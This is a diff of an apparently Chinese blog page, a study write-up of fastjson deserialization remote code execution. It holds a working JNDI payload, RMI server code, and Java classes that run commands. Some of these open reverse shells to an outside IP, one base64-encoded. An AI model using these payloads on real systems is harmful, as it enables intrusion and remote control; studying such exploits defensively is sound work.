@@ -439,18 +439,19 @@ http://blog.nsfocus.net/xss-advance/#23_DOM
 <h1 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson 1.2.47 rce"></a>fastjson 1.2.47 rce</h1><p>在渗透测试中 发现了fastjson的有漏洞的版本，<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640447555647.jpg" alt="-w682"></p>
 <p>想着尝试下</p>
 <h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>恶意攻击者可以构造攻击请求绕过FastJSON的黑名单策略。例如，攻击者通过精心构造的请求，远程让服务端执行指定命令</p>
-<h2 id="对应payload"><a href="#对应payload" class="headerlink" title="对应payload"></a>对应payload</h2><pre><code>{
-    &quot;name&quot;: {
-        &quot;@type&quot;: &quot;java.lang.Class&quot;,
-        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
-    },
-    &quot;x&quot;: {
-        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
-        &quot;dataSourceName&quot;:&quot;rmi://ip:port/Exploit&quot;,
-        &quot;autoCommit&quot;: true
-    }
-}
-</code></pre><p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15633821836741.jpg" alt="-w497"></p>
+<h2 id="对应payload"><a href="#对应payload" class="headerlink" title="对应payload"></a>对应payload</h2><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>
+    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
+        <span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+    <span class="token property">"x"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
+        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span>
+        <span class="token property">"autoCommit"</span><span class="token operator">:</span> <span class="token boolean">true</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15633821836741.jpg" alt="-w497"></p>
 <p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640448645384.jpg" alt="-w1093"></p>
 <p>此处简单测试了利用该命令漏洞会去请求exploit。<br>这个漏洞的利用方式跟18年的fastjson反序列化漏洞比较类似，这里先看下18年的fastjson漏洞，跟着分析下</p>
 <h2 id="FastJson-JdbcRowSetImpl"><a href="#FastJson-JdbcRowSetImpl" class="headerlink" title="FastJson-JdbcRowSetImpl"></a>FastJson-JdbcRowSetImpl</h2><h3 id="搭建漏洞环境"><a href="#搭建漏洞环境" class="headerlink" title="搭建漏洞环境"></a>搭建漏洞环境</h3><p>根据<a href="https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE" target="_blank" rel="noopener">FastJson-JdbcRowSetImpl</a>搭建该漏洞环境，进行测试, 该漏洞环境<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637129821308.jpg" alt="-w908"></p>
@@ -458,96 +459,101 @@ http://blog.nsfocus.net/xss-advance/#23_DOM
 </code></pre><h4 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h4><pre><code>java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar &lt;HTTP服务地址&gt; 指定RMI端口
 </code></pre><h4 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h4><p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640449119775.jpg" alt="-w1197"></p>
 <p>poc 如下<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637154042668.jpg" alt="-w756"></p>
-<pre><code>import    java.lang.Runtime;
-import    java.lang.Process;
-public class CommandObject {
-    public CommandObject(){
-        try{
-            Runtime    rt    =    Runtime.getRuntime();
-            //Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/ip/8550 0&gt;&amp;1&quot;);
-            //String[] commands = {&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=}|{base64,-d}|{bash,-i}&quot;};
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span>    java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span>
+<span class="token keyword">import</span>    java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Process<span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommandObject</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token function">CommandObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">try</span><span class="token punctuation">{</span>
+            Runtime    rt    <span class="token operator">=</span>    Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">//Runtime.getRuntime().exec("bash -i >&amp; /dev/tcp/ip/8550 0>&amp;1");</span>
+            <span class="token comment" spellcheck="true">//String[] commands = {"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=}|{base64,-d}|{bash,-i}"};</span>
 
-            String[] commands = {&quot;ping&quot;,&quot;xxxx.ceye.io&quot;};
-            Process    pc = rt.exec(commands);
-            System.out.println(&quot;11111&quot;);
-            pc.waitFor();
-        }catch(Exception e){
-            e.printStackTrace();
-            System.out.println(&quot;2222&quot;);
-        }
-    }
-    public static void main(String[] argv){
-        CommandObject e = new CommandObject();
-    }
-}
+            String<span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token string">"xxxx.ceye.io"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+            Process    pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"11111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        CommandObject e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CommandObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 
-</code></pre><p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637155154519.jpg" alt="-w1156"></p>
+</code></pre>
+<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637155154519.jpg" alt="-w1156"></p>
 <h4 id="反弹shell-测试"><a href="#反弹shell-测试" class="headerlink" title="反弹shell 测试"></a>反弹shell 测试</h4><pre><code>String[] commands = {&quot;bash -i &gt;&amp; /dev/tcp/ip/8550 0&gt;&amp;1&quot;};
 </code></pre><p>将此处直接修改为该命令，发现结果不行，直接运行该commandobject程序<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637230154421.jpg" alt="-w1112"><br>结果发现是zsh 不支持，切换个,网上一堆用如下java反弹shell的写法，结果发现在1.8的jdk，一直不符合格式</p>
 <pre><code>String[] commands = [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[];
 </code></pre><p>修改后如下,可以反弹shell，还有其他方式暂时未试，详情看<a href="https://blog.spoock.com/2018/11/07/java-reverse-shell/" target="_blank" rel="noopener">使用java反弹shell</a></p>
-<pre><code>import    java.lang.Runtime;
-import    java.lang.Process;
-public class fastjson {
-    public fastjson(){
-        try{
-            Runtime    rt    =    Runtime.getRuntime();
-                       //String[] commands = {&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=}|{base64,-d}|{bash,-i}&quot;};
-            //String[] commands = {&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;&#39;/bin/bash -i &gt;&amp; /dev/tcp/118.24.146.204/8550 0&gt;&amp;1&#39;&quot;};
-            Process    pc = rt.exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;});
-            //System.out.println(commands[0]);
-            pc.waitFor();
-        }catch(Exception e){
-            e.printStackTrace();
-        }
-    }
-    public static void main(String[] argv){
-        fastjson e = new fastjson();
-    }
-}
-</code></pre><p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640450186979.jpg" alt="-w1006"></p>
+<pre class=" language-java"><code class="language-java">
+<span class="token keyword">import</span>    java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span>
+<span class="token keyword">import</span>    java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Process<span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">fastjson</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token function">fastjson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">try</span><span class="token punctuation">{</span>
+            Runtime    rt    <span class="token operator">=</span>    Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                       <span class="token comment" spellcheck="true">//String[] commands = {"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=}|{base64,-d}|{bash,-i}"};</span>
+            <span class="token comment" spellcheck="true">//String[] commands = {"/bin/bash", "-c", "'/bin/bash -i >&amp; /dev/tcp/118.24.146.204/8550 0>&amp;1'"};</span>
+            Process    pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">//System.out.println(commands[0]);</span>
+            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        fastjson e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fastjson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640450186979.jpg" alt="-w1006"></p>
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据分析，这次遇到的fastjson漏洞不是最近1.2.47版本的，而是之前1.2.24<br>此处反编译的<br>FastJson_JdbcRowSetImpl_JNDI_RMIServer如下<br>创建rmi（java 本身的rpc框架） </p>
-<pre><code>import cn.com.topsec.fastjson.FastJson_JdbcRowSetImpl_JNDI_RMIServer;
-import com.sun.jndi.rmi.registry.ReferenceWrapper;
-import java.rmi.AlreadyBoundException;
-import java.rmi.RemoteException;
-import java.rmi.registry.LocateRegistry;
-import java.rmi.registry.Registry;
-import javax.naming.NamingException;
-import javax.naming.Reference;
+<pre class=" language-java"><code class="language-java">
+<span class="token keyword">import</span> cn<span class="token punctuation">.</span>com<span class="token punctuation">.</span>topsec<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>FastJson_JdbcRowSetImpl_JNDI_RMIServer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>AlreadyBoundException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>NamingException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Reference<span class="token punctuation">;</span>
 
 
-public class FastJson_JdbcRowSetImpl_JNDI_RMIServer
-{
-  public static void start(String httpServer, int rmiPort, String hostName) throws AlreadyBoundException, RemoteException, NamingException {
-    System.out.println(&quot;* Open JNDI-RMI Listener on &quot; + rmiPort);
-    System.out.println(&quot;\n [*] HTTPSERVER = &quot; + httpServer);
-    System.out.println(&quot; [*] RMIPORT = &quot; + rmiPort);
-System.setProperty(&quot;java.rmi.server.hostname&quot;, hostName);
-    Registry registry = LocateRegistry.createRegistry(rmiPort);
-    Reference reference = new Reference(&quot;CommandObject&quot;, &quot;CommandObject&quot;, httpServer);
-    ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
-    registry.bind(&quot;Object&quot;, referenceWrapper);
-  }
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastJson_JdbcRowSetImpl_JNDI_RMIServer</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span>String httpServer<span class="token punctuation">,</span> <span class="token keyword">int</span> rmiPort<span class="token punctuation">,</span> String hostName<span class="token punctuation">)</span> <span class="token keyword">throws</span> AlreadyBoundException<span class="token punctuation">,</span> RemoteException<span class="token punctuation">,</span> NamingException <span class="token punctuation">{</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"* Open JNDI-RMI Listener on "</span> <span class="token operator">+</span> rmiPort<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n [*] HTTPSERVER = "</span> <span class="token operator">+</span> httpServer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">" [*] RMIPORT = "</span> <span class="token operator">+</span> rmiPort<span class="token punctuation">)</span><span class="token punctuation">;</span>
+System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"java.rmi.server.hostname"</span><span class="token punctuation">,</span> hostName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span>rmiPort<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"CommandObject"</span><span class="token punctuation">,</span> <span class="token string">"CommandObject"</span><span class="token punctuation">,</span> httpServer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Object"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
 
-  public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
-    String httpServer = args[0];
-    int rmiPort = Integer.parseInt(args[1]);
+  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> NamingException<span class="token punctuation">,</span> AlreadyBoundException <span class="token punctuation">{</span>
+    String httpServer <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> rmiPort <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    String[] httpServerHost = httpServer.split(&quot;:&quot;);
+    String<span class="token punctuation">[</span><span class="token punctuation">]</span> httpServerHost <span class="token operator">=</span> httpServer<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    String hostName = httpServerHost[0];
+    String hostName <span class="token operator">=</span> httpServerHost<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-    httpServer = &quot;http://&quot; + httpServer + &quot;/&quot;;
+    httpServer <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> httpServer <span class="token operator">+</span> <span class="token string">"/"</span><span class="token punctuation">;</span>
 
-    start(httpServer, rmiPort, hostName);
-    System.out.println(&quot;\n [*] Payload���&quot;);
+    <span class="token function">start</span><span class="token punctuation">(</span>httpServer<span class="token punctuation">,</span> rmiPort<span class="token punctuation">,</span> hostName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n [*] Payload���"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    System.out.println(&quot; [+] {\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://&quot; + httpServerHost[0] + &quot;:&quot; + rmiPort + &quot;/Object\&quot;,\&quot;autoCommit\&quot;:true}&quot;);
-    System.out.println(&quot;\n [*] enjoy���&quot;);
-  }
-}
-</code></pre><h3 id="创建RMI-Server"><a href="#创建RMI-Server" class="headerlink" title="创建RMI Server"></a>创建RMI Server</h3><pre><code>package com.luckyqiao.rmi;
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">" [+] {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://"</span> <span class="token operator">+</span> httpServerHost<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> rmiPort <span class="token operator">+</span> <span class="token string">"/Object\",\"autoCommit\":true}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n [*] enjoy���"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h3 id="创建RMI-Server"><a href="#创建RMI-Server" class="headerlink" title="创建RMI Server"></a>创建RMI Server</h3><pre><code>package com.luckyqiao.rmi;
 
 import java.io.IOException;
 import java.rmi.AlreadyBoundException;
@@ -571,25 +577,27 @@ public class RMIServer {
     }
 }
 </code></pre><p>参照sky 的rmi server 进行修改如下</p>
-<pre><code>import com.sun.jndi.rmi.registry.ReferenceWrapper;
-import javax.naming.Reference;
-import java.rmi.registry.LocateRegistry;
-import java.rmi.registry.Registry;
+<pre class=" language-java"><code class="language-java">
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Reference<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span>
 
-/**
+<span class="token comment" spellcheck="true">/**
  * @author sky
- */
-public class rmiserver {
-    public static void main(String[] args) throws Exception {
-        Registry registry = LocateRegistry.createRegistry(1099);
-        Reference reference = new Reference(&quot;CommandObject&quot;,
-                &quot;CommandObject&quot;,&quot;http://localhost:80/&quot;);
-        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
-        registry.bind(&quot;Exploit&quot;,referenceWrapper);
-    }
+ */</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">rmiserver</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"CommandObject"</span><span class="token punctuation">,</span>
+                <span class="token string">"CommandObject"</span><span class="token punctuation">,</span><span class="token string">"http://localhost:80/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Exploit"</span><span class="token punctuation">,</span>referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-}
-</code></pre><p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637303551208.jpg" alt="-w1227"></p>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637303551208.jpg" alt="-w1227"></p>
 <p>整理下 利用方式<br>【1】首先准备一个 RMI Server<br>【2】开启对应的httpserver<br>【3】CommandObject.class 执行文件<br>【4】利用poc</p>
 <h3 id="1-2-47-与1-2-24的区别"><a href="#1-2-47-与1-2-24的区别" class="headerlink" title="1.2.47 与1.2.24的区别"></a>1.2.47 与1.2.24的区别</h3><p>在该漏洞情况下 poc与1.2.47 稍有区别<br>1.2.24 poc如下</p>
 <pre><code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:389/obj&quot;,&quot;autoCommit&quot;:true}
@@ -809,9 +817,9 @@ Content-Type代表发送端（客户端|服务器）发送的实体数据的数�
             
             <tag> Web渗透 </tag>
             
-            <tag> XXE </tag>
-            
             <tag> 漏洞学习 </tag>
+            
+            <tag> XXE </tag>
             
         </tags>
         
